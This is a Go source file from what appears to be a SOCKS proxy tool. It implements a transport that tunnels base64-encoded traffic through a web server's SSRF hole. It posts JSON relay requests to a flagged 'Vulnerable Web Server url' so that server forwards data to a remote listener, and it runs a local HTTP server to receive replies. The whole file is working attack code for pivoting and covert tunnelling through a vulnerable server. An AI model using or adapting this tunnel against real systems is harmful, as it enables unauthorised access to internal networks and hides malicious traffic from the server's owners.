package ssrf

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"socks.it/proxy"
	"socks.it/proxy/decorators"
	"socks.it/utils/errs"
	"time"
)

var ssrfURL = flag.String("ssrfURL", "http://localhost:10081/ssrf", "Vulnerable Web Server url")
var localServeURL = flag.String("localServeURL", "http://localhost:10082/", "Local side web server url")
var remoteServeURL = flag.String("remoteServeURL", "http://localhost:10083/", "Remote side web server url")

type ssrfMiddleman struct {
	name        string
	peer        string
	rawProxyURL string
	logger      *slog.Logger
}

type Option func(*ssrfMiddleman)

func WithProxy(rawProxyURL string) Option {
	return func(m *ssrfMiddleman) {
		m.rawProxyURL = rawProxyURL
	}
}

func New(name, peer string, logger *slog.Logger, options ...Option) proxy.Middleman {
	t := ssrfMiddleman{
		name:   name,
		peer:   peer,
		logger: logger,
	}

	for _, option := range options {
		option(&t)
	}

	return &t
}

func (s *ssrfMiddleman) Setup() error {
	return nil
}

func (s *ssrfMiddleman) Teardown() error {
	return nil
}

func (s *ssrfMiddleman) NewTransport() (proxy.Transporter, error) {
	t := &ssrfTransport{
		readChan:    make(chan *bytes.Buffer, 512),
		logger:      s.logger,
		name:        s.name,
		peer:        s.peer,
		rawProxyURL: s.rawProxyURL,
	}

	go t.listenAndServe()
	return decorators.NewBase64Transport(t, s.logger), nil
}

func (s *ssrfMiddleman) WriteSpace() int {
	return 4096 * 3 / 4 // base64 encoded
}

type ssrfTransport struct {
	name        string
	peer        string
	readChan    chan *bytes.Buffer
	logger      *slog.Logger
	rawProxyURL string
	server      *http.Server
}

func (t *ssrfTransport) listenAndServe() {
	serveURL, err := url.Parse(*localServeURL)
	if err != nil {
		t.logger.Error("Failed to parse localServeURL URL", "error", err)
		panic(err)
	}

	handler := http.NewServeMux()
	handler.HandleFunc(serveURL.Path,
		func(w http.ResponseWriter, request *http.Request) {
			w.WriteHeader(200)
			//w.Header().Set("Content-Type", "text/text; charset=utf-8")
			defer func() {
				_ = request.Body.Close()
			}()

			if request.URL.Query().Get("name") != t.peer {
				t.logger.Warn("Received from unknown peer", "name", t.peer, "from", request.URL.Query().Get("name"))
				return
			}

			buf := new(bytes.Buffer)
			if _, err := io.Copy(buf, request.Body); err != nil {
				t.logger.Error("Failed to read request body", "error", err)
				return
			}
			t.readChan <- buf
		})

	t.logger.Info("Starting web server", "address", serveURL.String())

	t.server = &http.Server{
		Addr:    serveURL.Host,
		Handler: handler,
	}
	if err := t.server.ListenAndServe(); err != nil {
		t.logger.Warn("Stop to serve", "error", err)
	}
}

func (t *ssrfTransport) NextWriter() (io.WriteCloser, error) {
	httpTransport := http.Transport{}
	if t.rawProxyURL != "" {
		p, err := url.Parse(t.rawProxyURL)
		if err != nil {
			t.logger.Error("failed to parse url", "error", err)
			return nil, errs.WithStack(err)
		}
		httpTransport.Proxy = http.ProxyURL(p)
	}

	return &ssrfTransportWriter{
		name: t.name,
		client: &http.Client{
			Transport: &httpTransport,
			Timeout:   10 * time.Second,
		},
	}, nil
}

type ssrfTransportWriter struct {
	bytes.Buffer
	name   string
	client *http.Client
}

func (w *ssrfTransportWriter) Close() error {
	var proxyRequest = struct {
		Method  string      `json:"method"`
		URL     string      `json:"url"`
		Headers http.Header `json:"headers,omitempty"`
		Body    string      `json:"body"`
	}{
		Method: "POST",
		URL:    fmt.Sprintf("%s?name=%s", *remoteServeURL, w.name),
		Body:   string(w.Buffer.Bytes()),
	}
	data, err := json.Marshal(&proxyRequest)
	if err != nil {
		return errs.WithStack(err)
	}

	_, err = w.client.Post(*ssrfURL, "text/plain", bytes.NewReader(data))
	return errs.WithStack(err)
}

func (t *ssrfTransport) NextReader() (io.Reader, error) {
	return <-t.readChan, nil
}

func (t *ssrfTransport) Close() error {
	_ = t.server.Shutdown(context.Background())
	close(t.readChan)
	return nil
}
